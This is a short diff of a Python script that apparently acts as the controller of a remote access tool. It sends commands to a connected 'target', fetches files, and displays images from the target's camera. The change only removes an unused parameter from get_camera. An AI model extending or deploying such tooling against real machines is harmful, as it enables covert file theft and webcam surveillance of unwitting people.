@@ -200,13 +200,11 @@ def get_file(command, conn):
                                                     'sent'):]), end="")
             break
 
-def get_camera(cmd, conn):
+
+def get_camera(conn):
     """
     The function gets an image from the client through the socket
     and shows it on the screen
-
-    :param cmd: The command with the file name
-    :type cmd: str
 
     :param conn: a connection
 
@@ -239,7 +237,7 @@ def send_target_commands(conn):
                     continue
                 elif cmd.__contains__('show camera'):
                     conn.send(str.encode(cmd))
-                    get_camera(cmd, conn)
+                    get_camera(conn)
                     continue
                 else:
                     conn.send(str.encode(cmd))
